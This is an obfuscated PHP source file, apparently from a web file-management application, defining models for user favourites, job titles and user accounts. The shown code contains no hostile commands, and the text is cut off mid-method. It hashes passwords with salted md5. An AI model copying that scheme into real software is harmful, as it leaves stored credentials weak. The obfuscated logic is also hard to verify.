<?php
 goto f‹ï±Ì‚¬â; dàÌ×¶†™: class UserFavModel extends ModelBase { protected $tableName = "\165\x73\145\x72\x5f\x66\141\166"; protected function cacheFunctionAlias($¦Ì¤×’ö) { $À„×Ù§È =& $_SERVER[†ûãı«°]; return array($À„×Ù§È[2099] => array(USER_ID, $À„×Ù§È[2474])); } protected function listData() { $×µÈèŞ =& $_SERVER[†ûãı«°]; $ëŒù¯¾Ñ = array($×µÈèŞ[1774] => USER_ID, $×µÈèŞ[561] => 0); $˜ûÚê¨¤ = $×µÈèŞ[2475]; $ÎÅ¼‚Æà = $this->field($˜ûÚê¨¤)->where($ëŒù¯¾Ñ)->order($×µÈèŞ[2476])->select(); return $ÎÅ¼‚Æà ? $ÎÅ¼‚Æà : array(); } protected function resetCache() { } protected function listView() { $Ş¼©Ó¸ =& $_SERVER[†ûãı«°]; $£ö¤òƒ¼ = $this->listData(); $¼µôñ÷ = array_filter_by_field($£ö¤òƒ¼, $Ş¼©Ó¸[33], $Ş¼©Ó¸[492]); $¥³³Ö¾ = array_to_keyvalue($¼µôñ÷, $Ş¼©Ó¸[12], $Ş¼©Ó¸[87]); if (!$¥³³Ö¾) { return $£ö¤òƒ¼; } $ã”¬Œö¹ = 2000; $¿Í´ûÎ” = array($Ş¼©Ó¸[493] => array($Ş¼©Ó¸[494], $¥³³Ö¾)); $€×áŸ¼› = Model($Ş¼©Ó¸[906])->listSource($¿Í´ûÎ”, $ã”¬Œö¹); $€×áŸ¼› = array_merge($€×áŸ¼›[$Ş¼©Ó¸[86]], $€×áŸ¼›[$Ş¼©Ó¸[85]]); $€×áŸ¼› = array_to_keyvalue($€×áŸ¼›, $Ş¼©Ó¸[193]); foreach ($£ö¤òƒ¼ as $ïåŒşü => $Ä³¿³™ê) { $øÉ²÷úµ = $€×áŸ¼›[$Ä³¿³™ê[$Ş¼©Ó¸[87]]]; $øÉ²÷úµ = $øÉ²÷úµ ? $øÉ²÷úµ : array(); $£ö¤òƒ¼[$ïåŒşü] = array_merge($øÉ²÷úµ, $Ä³¿³™ê); } return $£ö¤òƒ¼; } protected function addFav($âÏÃ«âÏ, $æ»ã©Ş = '', $ËÈ§¸ = "\163\157\x75\162\143\145") { $ÎŠ‡™Ü¥ =& $_SERVER[†ûãı«°]; $ê‹¦ªŞ“ = array($ÎŠ‡™Ü¥[1774] => USER_ID, $ÎŠ‡™Ü¥[561] => 0, $ÎŠ‡™Ü¥[498] => $ËÈ§¸, $ÎŠ‡™Ü¥[497] => $âÏÃ«âÏ); if ($this->where($ê‹¦ªŞ“)->find()) { return !1; } $ê‹¦ªŞ“ = array($ÎŠ‡™Ü¥[1774] => USER_ID, $ÎŠ‡™Ü¥[561] => 0); $¬Õ¹õùÔ = $this->where($ê‹¦ªŞ“)->max($ÎŠ‡™Ü¥[2008]); if (!$¬Õ¹õùÔ) { $¬Õ¹õùÔ = 0; } if (!$æ»ã©Ş && $ËÈ§¸ == $ÎŠ‡™Ü¥[492]) { $¥æÆ¬÷ú = Model($ÎŠ‡™Ü¥[1432])->where(array($ÎŠ‡™Ü¥[493] => $âÏÃ«âÏ))->find(); if (!$¥æÆ¬÷ú) { return !1; } $æ»ã©Ş = $¥æÆ¬÷ú[$ÎŠ‡™Ü¥[32]]; } $æ»ã©Ş = $this->getAutoName($æ»ã©Ş); $ö‚Û–ğ¨ = array($ÎŠ‡™Ü¥[1774] => USER_ID, $ÎŠ‡™Ü¥[561] => 0, $ÎŠ‡™Ü¥[496] => $æ»ã©Ş, $ÎŠ‡™Ü¥[497] => $âÏÃ«âÏ, $ÎŠ‡™Ü¥[498] => $ËÈ§¸, $ÎŠ‡™Ü¥[1988] => $¬Õ¹õùÔ + 1); return $this->add($ö‚Û–ğ¨); } protected function remove($à‡·¥¨ø) { $ò«·© =& $_SERVER[†ûãı«°]; $à‹Óüï = array($ò«·©[1774] => USER_ID, $ò«·©[495] => $à‡·¥¨ø); return $this->where($à‹Óüï)->delete(); } protected function removeByName($°ôµŒ¬Ñ) { $¥Ğ¯ˆ =& $_SERVER[†ûãı«°]; $‰¥Û¬ = array($¥Ğ¯ˆ[1774] => USER_ID, $¥Ğ¯ˆ[496] => $°ôµŒ¬Ñ, $¥Ğ¯ˆ[561] => 0); return $this->where($‰¥Û¬)->delete(); } protected function rename($Øæ‚’À“, $ñü¯İû) { $‰¼Í¯Ø =& $_SERVER[†ûãı«°]; if ($Øæ‚’À“ == $ñü¯İû) { return !1; } $óå´–á = $this->getAutoName($ñü¯İû); if ($ñü¯İû != $óå´–á) { return !1; } $†û¬ Ğ = array($‰¼Í¯Ø[1774] => USER_ID, $‰¼Í¯Ø[561] => 0, $‰¼Í¯Ø[32] => $Øæ‚’À“); return $this->where($†û¬ Ğ)->save(array($‰¼Í¯Ø[32] => $ñü¯İû)); } protected function resetSort($Œ¾…ŠóÕ) { $ õŞô˜ =& $_SERVER[†ûãı«°]; $Œ¾…ŠóÕ = is_array($Œ¾…ŠóÕ) ? $Œ¾…ŠóÕ : array(); $Ùë¯·ÄÜ = array($ õŞô˜[1774] => USER_ID); for ($¯ª¨åº = 0; $¯ª¨åº < count($Œ¾…ŠóÕ); $¯ª¨åº++) { $Ùë¯·ÄÜ[$ õŞô˜[495]] = $Œ¾…ŠóÕ[$¯ª¨åº]; $this->where($Ùë¯·ÄÜ)->save(array($ õŞô˜[1988] => $¯ª¨åº + 1)); } return !0; } protected function moveTop($÷…ßùã) { $¡ÚÂ›úÔ =& $_SERVER[†ûãı«°]; $™êÀ“¡ = array($¡ÚÂ›úÔ[1774] => USER_ID, $¡ÚÂ›úÔ[561] => 0); $¢´úƒµ´ = $this->where($™êÀ“¡)->where(array($¡ÚÂ›úÔ[32] => $÷…ßùã))->find(); if (!$¢´úƒµ´) { return; } $‹Ú¿©ÎÔ = $this->field($¡ÚÂ›úÔ[477])->where($™êÀ“¡)->order($¡ÚÂ›úÔ[2476])->select(); $‹Ú¿©ÎÔ = array_to_keyvalue($‹Ú¿©ÎÔ, $¡ÚÂ›úÔ[12], $¡ÚÂ›úÔ[477]); $ÎõšÌì = $‹Ú¿©ÎÔ; $‹Ú¿©ÎÔ = array_remove_value($‹Ú¿©ÎÔ, $¢´úƒµ´[$¡ÚÂ›úÔ[477]]); array_unshift($‹Ú¿©ÎÔ, $¢´úƒµ´[$¡ÚÂ›úÔ[477]]); return $this->resetSort($‹Ú¿©ÎÔ); } protected function moveBottom($ÊÌªÎ’ü) { $Ì££Şèñ =& $_SERVER[†ûãı«°]; $âœä¶ı¨ = array($Ì££Şèñ[1774] => USER_ID, $Ì££Şèñ[561] => 0); $Ëˆ©¿¹Œ = $this->where($âœä¶ı¨)->max($Ì££Şèñ[2008]); $û¼„·‡ = array($Ì££Şèñ[2008] => $Ëˆ©¿¹Œ + 1); return $this->where($âœä¶ı¨)->where(array($Ì££Şèñ[32] => $ÊÌªÎ’ü))->save($û¼„·‡); } private function getAutoName($ó”³±şˆ) { $ééç•² =& $_SERVER[†ûãı«°]; $ÍîÆÓç¤ = array($ééç•²[1774] => USER_ID, $ééç•²[561] => 0); $ÀÜïÆ† = $this->field($ééç•²[32])->where($ÍîÆÓç¤)->select(); $ÀÜïÆ† = array_to_keyvalue($ÀÜïÆ†, $ééç•²[12], $ééç•²[32]); if (!$ÀÜïÆ† || !in_array($ó”³±şˆ, $ÀÜïÆ†)) { return $ó”³±şˆ; } for ($ı˜’—–§ = 0; $ı˜’—–§ < count($ÀÜïÆ†); $ı˜’—–§++) { if (!in_array($ó”³±şˆ . "\x28{$ı˜’—–§}\x29", $ÀÜïÆ†)) { return $ó”³±şˆ . "\x28{$ı˜’—–§}\51"; } } return $ó”³±şˆ . "\50{$ı˜’—–§}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\x6d\56\x6a\157\142\114\151\163\164"; public $field = array("\x6e\x61\x6d\145", "\x64\145\163\143", "\163\x6f\162\x74"); const JOB_KEY = "\163\145\154\146\112\x6f\x62\114\x69\x73\164"; public function listData($Åßµ«ûæ = false, $ğ§‰É¢½ = "\x73\x6f\162\x74", $†×±Üó = false) { return parent::listData($Åßµ«ûæ, $ğ§‰É¢½, $†×±Üó); } public function remove($ß§Í’¥Ø) { return parent::remove($ß§Í’¥Ø); } public function add($ˆŠğŞåº) { $¾¸Ô£ï• =& $_SERVER[†ûãı«°]; if ($this->findByName($ˆŠğŞåº[$¾¸Ô£ï•[32]])) { return !1; } $ˆŠğŞåº[$¾¸Ô£ï•[2008]] = $this->getSort(); return parent::insert($ˆŠğŞåº); } private function getSort() { $ßšó¤ ¶ =& $_SERVER[†ûãı«°]; $ã›½º”Ä = parent::listData(); $ı£‘²¦ë = array_to_keyvalue($ã›½º”Ä, $ßšó¤ ¶[12], $ßšó¤ ¶[2008]); return empty($ı£‘²¦ë) ? 0 : max($ı£‘²¦ë) + 1; } public function update($ß“²»¨ê, $şıé†¥İ) { $íÓ±ìüı =& $_SERVER[†ûãı«°]; $ˆÌìŸ = parent::listData($ß“²»¨ê); $ñö®ş½º = $this->findByName($şıé†¥İ[$íÓ±ìüı[32]]); if (!$ˆÌìŸ || $ñö®ş½º && $ñö®ş½º[$íÓ±ìüı[477]] != $ˆÌìŸ[$íÓ±ìüı[477]]) { return !1; } return parent::update($ß“²»¨ê, $şıé†¥İ); } public function setUserJob($ÛÊ‹şÁÚ, $¥Ó¿’Ë) { $èšÈÜ–¢ =& $_SERVER[†ûãı«°]; if (!is_array($¥Ó¿’Ë)) { $¥Ó¿’Ë = array($¥Ó¿’Ë); } $¡¦‡óùı = parent::listData(); $è²Ù¥½ = array_to_keyvalue($¡¦‡óùı, $èšÈÜ–¢[32]); $³¼²ò´Ò = $èšÈÜ–¢[456]; foreach ($¥Ó¿’Ë as $—„ÃâÔ˜) { if ($è²Ù¥½[$—„ÃâÔ˜]) { $³¼²ò´Ò .= $è²Ù¥½[$—„ÃâÔ˜][$èšÈÜ–¢[477]] . $èšÈÜ–¢[50]; } else { $Æ÷Ğ¡ü = $this->add($—„ÃâÔ˜); $³¼²ò´Ò .= $Æ÷Ğ¡ü . $èšÈÜ–¢[50]; } } $³¼²ò´Ò = rtrim($³¼²ò´Ò, $èšÈÜ–¢[50]); Model($èšÈÜ–¢[601])->metaSet($ÛÊ‹şÁÚ, self::JOB_KEY, $³¼²ò´Ò); } public function getUserJob($Ñğ–»€“) { $åŠÊœÅİ = Model($_SERVER[†ûãı«°][601])->metaGet($Ñğ–»€“); return $this->getUserJobInfo($åŠÊœÅİ[self::JOB_KEY]); } public function getUserJobInfo($¾¤§ğªê) { $Ÿ•³âÖ† =& $_SERVER[†ûãı«°]; $Ù×ŠÒ±È = explode($Ÿ•³âÖ†[50], $¾¤§ğªê); $şİş•í£ = parent::listData(); $şİş•í£ = array_remove_key($şİş•í£, $Ÿ•³âÖ†[233]); $í¬Ÿßø = array(); foreach ($Ù×ŠÒ±È as $ú¶±áı”) { if (isset($şİş•í£[$ú¶±áı”])) { $í¬Ÿßø[] = $şİş•í£[$ú¶±áı”]; } } return $í¬Ÿßø; } } class UserModel extends ModelBase { protected $tableName = "\x75\163\x65\x72"; protected $tableMeta = array("\x74\141\x62\154\145\116\x61\155\145" => "\165\x73\145\162\137\155\x65\164\141", "\x6d\145\x74\x61\106\151\145\x6c\x64" => "\x75\x73\x65\x72\x49\x44"); protected $simpleField = "\x75\163\x65\x72\x49\x44\x2c\x6e\x69\x63\153\x4e\141\x6d\x65\x2c\x6e\x61\x6d\x65\54\x61\x76\x61\x74\141\162\54\163\x65\x78\54\x73\164\141\164\165\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($Ë½µ¨íï) { $¾µ¦ø¿ì =& $_SERVER[†ûãı«°]; $Ìœ‹Î¬Ä = $¾µ¦ø¿ì[2477]; return array($¾µ¦ø¿ì[2066] => array($Ë½µ¨íï[0], $Ìœ‹Î¬Ä), $¾µ¦ø¿ì[2068] => array($Ë½µ¨íï[0], $Ìœ‹Î¬Ä), $¾µ¦ø¿ì[2478] => array($Ë½µ¨íï[0], $Ìœ‹Î¬Ä)); } protected function getInfo($Ö¶¨«âî, $“¥ƒÂÍ = false) { $õéåÏ‰ = $this->getInfoSimple($Ö¶¨«âî); if (!is_array($õéåÏ‰)) { return array(); } if ($“¥ƒÂÍ) { return $this->_getInfoApply($õéåÏ‰); } return $this->cacheFunctionGet($_SERVER[†ûãı«°][2070], $Ö¶¨«âî); } protected function getInfoFull($ô¦¢Òµ™, $şâÕ«­ = false) { $”õ€ä¢ª = $this->getInfoSimple($ô¦¢Òµ™); if (!is_array($”õ€ä¢ª)) { return array(); } if ($şâÕ«­) { return $this->_getInfoApply($”õ€ä¢ª, !0); } return $this->cacheFunctionGet($_SERVER[†ûãı«°][2479], $ô¦¢Òµ™); } private function _getInfoApply($Åõ¿ô“ê, $Ò”ë›¢Á = false) { $èŸ´£é… =& $_SERVER[†ûãı«°]; if (!$Åõ¿ô“ê) { return $Åõ¿ô“ê; } $¦´Ò‰Ëí = md5($èŸ´£é…[2480] . $Åõ¿ô“ê[$èŸ´£é…[977]] . $èŸ´£é…[2481] . $Åõ¿ô“ê[$èŸ´£é…[32]]); $Åõ¿ô“ê = $this->_listDataApplyItem($Åõ¿ô“ê); $¬ùÖÖ¬ = Model($èŸ´£é…[1432])->metaGet($Åõ¿ô“ê[$èŸ´£é…[90]][$èŸ´£é…[193]]); $Åõ¿ô“ê[$èŸ´£é…[2482]] = $¦´Ò‰Ëí; $Åõ¿ô“ê[$èŸ´£é…[90]][$èŸ´£é…[2270]] = isset($¬ùÖÖ¬[$èŸ´£é…[2271]]) ? $¬ùÖÖ¬[$èŸ´£é…[2271]] : null; if ($Ò”ë›¢Á) { $Åõ¿ô“ê[$èŸ´£é…[543]] = $this->metaGet($Åõ¿ô“ê[$èŸ´£é…[1783]]); } return $Åõ¿ô“ê; } protected function getInfoSimple($øáö££ñ, $°û€Óİí = false) { $‚ƒí°·Ä =& $_SERVER[†ûãı«°]; if (!$øáö££ñ) { return array(); } if ($°û€Óİí) { $²Øì®Êß = $this->where(array($‚ƒí°·Ä[1783] => intval($øáö££ñ)))->find(); if (!is_array($²Øì®Êß)) { return array(); } $²Øì®Êß[$‚ƒí°·Ä[2483]] = Action($‚ƒí°·Ä[2484])->parseUrl($²Øì®Êß[$‚ƒí°·Ä[2483]]); return $²Øì®Êß; } return $this->cacheFunctionGet($‚ƒí°·Ä[2071], $øáö££ñ); } protected function getInfoSimpleOuter($Ê×à¯çô) { $éÜ™ÀÙÑ =& $_SERVER[†ûãı«°]; if (!$Ê×à¯çô || $Ê×à¯çô == 0) { return array($éÜ™ÀÙÑ[1783] => $éÜ™ÀÙÑ[230], $éÜ™ÀÙÑ[32] => $éÜ™ÀÙÑ[176] . LNG($éÜ™ÀÙÑ[2485]) . $éÜ™ÀÙÑ[178], $éÜ™ÀÙÑ[2483] => STATIC_PATH . $éÜ™ÀÙÑ[2486]); } $Åµó¡Óï = $this->cacheFunctionGet($éÜ™ÀÙÑ[2071], $Ê×à¯çô); $¡Æ‚²²ı = array_field_key($Åµó¡Óï, explode($éÜ™ÀÙÑ[50], $this->simpleField)); if (!$¡Æ‚²²ı) { return array($éÜ™ÀÙÑ[1783] => $éÜ™ÀÙÑ[1284], $éÜ™ÀÙÑ[32] => $éÜ™ÀÙÑ[176] . LNG($éÜ™ÀÙÑ[2487]) . $éÜ™ÀÙÑ[178], $éÜ™ÀÙÑ[2483] => STATIC_PATH . $éÜ™ÀÙÑ[2488]); } $¡Æ‚²²ı[$éÜ™ÀÙÑ[2483]] = Action($éÜ™ÀÙÑ[2484])->parseUrl($¡Æ‚²²ı[$éÜ™ÀÙÑ[2483]]); return $¡Æ‚²²ı; } protected function groupUser($’‡âË¥Ï) { } public static function errorLang($ÅŞ³È‰¢) { $ıÈ‰ô°Ó =& $_SERVER[†ûãı«°]; $…ó°š‡ = array(self::ERROR_USER_NOT_EXISTS => $ıÈ‰ô°Ó[2489], self::ERROR_USER_PASSWORD_ERROR => $ıÈ‰ô°Ó[2490], self::ERROR_USER_EXIST_NAME => $ıÈ‰ô°Ó[2491], self::ERROR_USER_EXIST_PHONE => $ıÈ‰ô°Ó[2492], self::ERROR_USER_EXIST_EMAIL => $ıÈ‰ô°Ó[2493], self::ERROR_USER_LOGIN_LOCK => $ıÈ‰ô°Ó[2494], self::ERROR_IP_NOT_ALLOW => $ıÈ‰ô°Ó[2495], self::ERROR_USER_EXIST_NICKNAME => $ıÈ‰ô°Ó[2496]); $ëú¯ßı = LNG($…ó°š‡[$ÅŞ³È‰¢]); if ($ÅŞ³È‰¢ == self::ERROR_USER_LOGIN_LOCK) { $¼‰÷øø = (int) Model($ıÈ‰ô°Ó[2497])->get($ıÈ‰ô°Ó[2498]); if ($¼‰÷øø > 60) { $ëú¯ßı = str_replace($ıÈ‰ô°Ó[91], ceil($¼‰÷øø / 60), $ëú¯ßı); } } return $ëú¯ßı; } protected function metaSet($ó‹ÙÀƒ§, $£”±¶ÌŞ = null, $ÙÁ·êª = null) { $this->clearCache($ó‹ÙÀƒ§); return parent::metaSet($ó‹ÙÀƒ§, $£”±¶ÌŞ, $ÙÁ·êª); } public function getInfoByMeta($ŒİŸ„óì, $™¨Œ³½Ô) { $ì« ‘ü† =& $_SERVER[†ûãı«°]; $§æ¥§ = Model($ì« ‘ü†[2499])->where(array($ì« ‘ü†[97] => $ŒİŸ„óì, $ì« ‘ü†[452] => $™¨Œ³½Ô))->find(); if ($§æ¥§) { return $this->getInfo($§æ¥§[$ì« ‘ü†[1783]]); } return !1; } public function userLoginCheck($Á¸œèú”, $Ó°¤—ø§) { $ª·ñ¡ø¦ =& $_SERVER[†ûãı«°]; $¬ò±ê ˜ = $this->userLoginFind($Á¸œèú”); if (!$¬ò±ê ˜) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($¬ò±ê ˜[$ª·ñ¡ø¦[1783]], $Ó°¤—ø§)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($¬ò±ê ˜[$ª·ñ¡ø¦[1783]]); } public function userLoginFind($Í§êºÊ) { $•æ©±• =& $_SERVER[†ûãı«°]; $Æ†îßÃ = array($•æ©±•[32] => $Í§êºÊ, $•æ©±•[2283] => $Í§êºÊ, $•æ©±•[382] => $Í§êºÊ, $•æ©±•[2500] => $Í§êºÊ, $•æ©±•[1088] => $•æ©±•[1090]); if ($this->nickNameRpt()) { unset($Æ†îßÃ[$•æ©±•[2283]]); } return $this->where($Æ†îßÃ)->find(); } public function clearCache($Ç¤¦†ı½) { $Õİêˆ©û =& $_SERVER[†ûãı«°]; $this->cacheFunctionClear($Õİêˆ©û[2070], $Ç¤¦†ı½); $this->cacheFunctionClear($Õİêˆ©û[2071], $Ç¤¦†ı½); $this->cacheFunctionClear($Õİêˆ©û[2479], $Ç¤¦†ı½); } public function userPasswordCheck($ÏÅ“¶ñì, $Ş×û§·ç) { $œ¢öä…Á =& $_SERVER[†ûãı«°]; $ÉÚõ›»¢ = $this->where(array($œ¢öä…Á[1783] => intval($ÏÅ“¶ñì)))->find(); $„úõóçê = $this->metaGet($ÏÅ“¶ñì); $Â€ìñÌ = isset($„úõóçê[$œ¢öä…Á[2501]]) ? $„úõóçê[$œ¢öä…Á[2501]] : $œ¢öä…Á[12]; if (md5($Â€ìñÌ . trim($Ş×û§·ç)) !== $ÉÚõ›»¢[$œ¢öä…Á[977]]) { return !1; } return !0; } public function userAdd($ä§Ì»Ï) { $´Ğºæ¢ =& $_SERVER[†ûãı«°]; $ó—°Çä¸ = array($´Ğºæ¢[496] => $ä§Ì»Ï[$´Ğºæ¢[32]], $´Ğºæ¢[2502] => $ä§Ì»Ï[$´Ğºæ¢[2194]], $´Ğºæ¢[2503] => isset($ä§Ì»Ï[$´Ğºæ¢[382]]) ? $ä§Ì»Ï[$´Ğºæ¢[382]] : $´Ğºæ¢[12], $´Ğºæ¢[2504] => isset($ä§Ì»Ï[$´Ğºæ¢[2500]]) ? $ä§Ì»Ï[$´Ğºæ¢[2500]] : $´Ğºæ¢[12], $´Ğºæ¢[2505] => isset($ä§Ì»Ï[$´Ğºæ¢[2283]]) ? $ä§Ì»Ï[$´Ğºæ¢[2283]] : $ä§Ì»Ï[$´Ğºæ¢[32]], $´Ğºæ¢[2506] => isset($ä§Ì»Ï[$´Ğºæ¢[2483]]) ? $ä§Ì»Ï[$´Ğºæ¢[2483]] : $´Ğºæ¢[12], $´Ğºæ¢[2507] => isset($ä§Ì»Ï[$´Ğºæ¢[2508]]) ? $ä§Ì»Ï[$´Ğºæ¢[2508]] : 1, $´Ğºæ¢[2509] => $ä§Ì»Ï[$´Ğºæ¢[977]], $´Ğºæ¢[2072] => isset($ä§Ì»Ï[$´Ğºæ¢[1970]]) ? $ä§Ì»Ï[$´Ğºæ¢[1970]] : 1024 * 1024 * 20, $´Ğºæ¢[2073] => 0, $´Ğºæ¢[2510] => 0, $´Ğºæ¢[2117] => isset($ä§Ì»Ï[$´Ğºæ¢[826]]) ? $ä§Ì»Ï[$´Ğºæ¢[826]] : 1); if (!empty($ä§Ì»Ï[$´Ğºæ¢[1783]])) { $ó—°Çä¸[$´Ğºæ¢[1783]] = $ä§Ì»Ï[$´Ğºæ¢[1783]]; } $Ÿö©àñ¥ = $this->_checkExist($ä§Ì»Ï); if ($Ÿö©àñ¥ !== !0) { return $Ÿö©àñ¥; } if (!empty($ó—°Çä¸[$´Ğºæ¢[2483]]) && strlen($ó—°Çä¸[$´Ğºæ¢[2483]]) > 255) { $ó—°Çä¸[$´Ğºæ¢[2483]] = $´Ğºæ¢[12]; } $´ı‡ãè‘ = $this->add($ó—°Çä¸); $ú¤«úôã = array($´Ğºæ¢[2509] => $ó—°Çä¸[$´Ğºæ¢[977]], $´Ğºæ¢[2505] => $ó—°Çä¸[$´Ğºæ¢[2283]]); $this->userEdit($´ı‡ãè‘, $ú¤«úôã); Model($´Ğºæ¢[1432])->userRootAdd($´ı‡ãè‘); return $´ı‡ãè‘; } protected function userEditTest($ú—ºœÂ , $“Ì¶éõö) { return $this->call($_SERVER[†ûãı«°][2511], $ú—ºœÂ , $“Ì¶éõö); } protected function userEdit($Ğ›Ç«Æ, $éÚÌ°ğû) { $±ÖÚÃœ =& $_SERVER[†ûãı«°]; $šÅ™ŠŠö = $this->getInfoSimple($Ğ›Ç«Æ); if (!$šÅ™ŠŠö) { return !1; } $’¤ñ”ü = $this->_checkExist($éÚÌ°ğû, $Ğ›Ç«Æ); if ($’¤ñ”ü !== !0) { return $’¤ñ”ü; } if (isset($éÚÌ°ğû[$±ÖÚÃœ[977]]) && trim($éÚÌ°ğû[$±ÖÚÃœ[977]]) != $±ÖÚÃœ[12]) { $Ê¶™’‹  = $this->metaGet($Ğ›Ç«Æ); if (empty($Ê¶™’‹ [$±ÖÚÃœ[2501]])) { $Ê¶™’‹ [$±ÖÚÃœ[2501]] = rand_string(10); Model($±ÖÚÃœ[581])->metaSet($Ğ›Ç«Æ, $±ÖÚÃœ[2501], $Ê¶™’‹ [$±ÖÚÃœ[2501]]); } $éÚÌ°ğû[$±ÖÚÃœ[977]] = md5($Ê¶™’‹ [$±ÖÚÃœ[2501]] . trim($éÚÌ°ğû[$±ÖÚÃœ[977]])); } else { unset($éÚÌ°ğû[$±ÖÚÃœ[977]]); } if (!empty($éÚÌ°ğû[$±ÖÚÃœ[2483]]) && strlen($éÚÌ°ğû[$±ÖÚÃœ[2483]]) > 255) { $éÚÌ°ğû[$±ÖÚÃœ[2483]] = $±ÖÚÃœ[12]; } $this->where(array($±ÖÚÃœ[1774] => $Ğ›Ç«Æ))->save($éÚÌ°ğû); if (isset($éÚÌ°ğû[$±ÖÚÃœ[2283]])) { $this->setNamePinyin($Ğ›Ç«Æ, $éÚÌ°ğû[$±ÖÚÃœ[2283]]); } $this->clearCache($Ğ›Ç«Æ); return !0; } public function setNamePinyin($Ãø•ÓĞ°, $™İ¹ÂãÃ = false) { $İ©…¥® =& $_SERVER[†ûãı«°]; if (!$™İ¹ÂãÃ) { $ÆÑÀô¾ˆ = $this->getInfoSimple($Ãø•ÓĞ°); $™İ¹ÂãÃ = $ÆÑÀô¾ˆ[$İ©…¥®[2283]] ? $ÆÑÀô¾ˆ[$İ©…¥®[2283]] : $ÆÑÀô¾ˆ[$İ©…¥®[32]]; } $Ùè‘¿ì = Model($İ©…¥®[601]); if (!Input::check($™İ¹ÂãÃ, $İ©…¥®[662])) { return $Ùè‘¿ì->metaSet($Ãø•ÓĞ°, array($İ©…¥®[540] => $İ©…¥®[12], $İ©…¥®[539] => $İ©…¥®[12])); } return $Ùè‘¿ì->metaSet($Ãø•ÓĞ°, array($İ©…¥®[540] => str_replace($İ©…¥®[53], $İ©…¥®[12], Pinyin::get($™İ¹ÂãÃ)), $İ©…¥®[539] => Pinyin::get($™İ¹ÂãÃ, $İ©…¥®[663]))); } private function nickNameRpt() { $¬ìÏìß =& $_SERVER[†ûãı«°]; $ÈááßØö = Model($¬ìÏìß[846])->get($¬ìÏìß[2512]); $ŞÙ¨çöÃ = $GLOBALS[$¬ìÏìß[6]][$¬ìÏìß[459]][$¬ìÏìß[2512]]; $è±“úİ = !is_null($ÈááßØö) ? $ÈááßØö : $ŞÙ¨çöÃ; return !!$è±“úİ; } private function _checkExist($¬Ù—ÄÂŸ, $¥úÎÈ˜· = false) { $©Áµ†îÙ =& $_SERVER[†ûãı«°]; $Ëò±Û› = array($©Áµ†îÙ[32] => UserModel::ERROR_USER_EXIST_NAME, $©Áµ†îÙ[2283] => UserModel::ERROR_USER_EXIST_NICKNAME, $©Áµ†îÙ[382] => UserModel::ERROR_USER_EXIST_EMAIL, $©Áµ†îÙ[2500] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($Ëò±Û›[$©Áµ†îÙ[2283]]); } $ÅîéóŒš = $¥úÎÈ˜· ? array($©Áµ†îÙ[1783] => array($©Áµ†îÙ[2513], $¥úÎÈ˜·)) : array(); foreach ($Ëò±Û› as $¥¤Šì™Ê => $“©ÓİéÍ) { $´ÚÉ±¦Ü = array(); foreach ($Ëò±Û› as $¯äçä¦ => $Ò—­Ö½Ì) { if (isset($¬Ù—ÄÂŸ[$¯äçä¦]) && $¬Ù—ÄÂŸ[$¯äçä¦]) { $´ÚÉ±¦Ü[] = $¬Ù—ÄÂŸ[$¯äçä¦]; } } if (!$´ÚÉ±¦Ü) { continue; } $Ù•×ïÀ¸ = array_merge(array($¥¤Šì™Ê => array($©Áµ†îÙ[7], $´ÚÉ±¦Ü)), $ÅîéóŒš); $Ó›íí = $this->where($Ù•×ïÀ¸)->find(); if ($Ó›íí) { return $“©ÓİéÍ; } } return !0; } public function userListInfo($ÃÁÍÜéÓ) { $ï¹Îû¹ß =& $_SERVER[†ûãı«°]; $œÖ’ÉÎÂ = array(); $ÃÁÍÜéÓ = is_array($ÃÁÍÜéÓ) ? array_unique($ÃÁÍÜéÓ) : array(); if (!$ÃÁÍÜéÓ) { return $œÖ’ÉÎÂ; } if (count($ÃÁÍÜéÓ) < 20) { foreach ($ÃÁÍÜéÓ as $Á£áëğë) { $œÖ’ÉÎÂ[$Á£áëğë . $ï¹Îû¹ß[12]] = $this->getInfoSimpleOuter($Á£áëğë); } } else { $Ö„ÒœŒ = array($ï¹Îû¹ß[1774] => array($ï¹Îû¹ß[494], $ÃÁÍÜéÓ)); if (count($ÃÁÍÜéÓ) == 1) { $Ö„ÒœŒ = array($ï¹Îû¹ß[1774] => $ÃÁÍÜéÓ[0]); } $Á¯·ò©° = Model($ï¹Îû¹ß[581])->field($this->simpleField)->where($Ö„ÒœŒ)->select(); $Á¯·ò©° = array_to_keyvalue($Á¯·ò©°, $ï¹Îû¹ß[1783]); foreach ($ÃÁÍÜéÓ as $Á£áëğë) { $ÇÃ¶“äü = $Á¯·ò©°[$Á£áëğë]; if (!$ÇÃ¶“äü) { $œÖ’ÉÎÂ[$Á£áëğë . $ï¹Îû¹ß[12]] = $this->getInfoSimpleOuter($Á£áëğë); continue; } $ÇÃ¶“äü[$ï¹Îû¹ß[2483]] = Action($ï¹Îû¹ß[2484])->parseUrl($ÇÃ¶“äü[$ï¹Îû¹ß[2483]]); $œÖ’ÉÎÂ[$Á£áëğë . $ï¹Îû¹ß[12]] = $ÇÃ¶“äü; } } return $œÖ’ÉÎÂ; } protected function userStatus($§Ğ’¶ÃÜ, $×Á¹õ—ñ) { $ÚôÇ§† = $this->getInfoSimple($§Ğ’¶ÃÜ); if (!$ÚôÇ§†) { return !1; } $ô¨¨à÷¬ = array($_SERVER[†ûãı«°][826] => $×Á¹õ—ñ); return $this->userEdit($§Ğ’¶ÃÜ, $ô¨¨à÷¬); } protected function userRemove($éÓá§Ï) { $²ÊÙıŞŠ =& $_SERVER[†ûãı«°]; $ÚÓËıÕ = $this->getInfoSimple($éÓá§Ï); if (!$ÚÓËıÕ) { return !1; } $¤ë³¿å¨ = array($²ÊÙıŞŠ[1774] => $éÓá§Ï); Model($²ÊÙıŞŠ[671])->where($¤ë³¿å¨)->delete(); Model($²ÊÙıŞŠ[2514])->where($¤ë³¿å¨)->delete(); Model($²ÊÙıŞŠ[2078])->where($¤ë³¿å¨)->delete(); Model($²ÊÙıŞŠ[2499])->where($¤ë³¿å¨)->delete(); 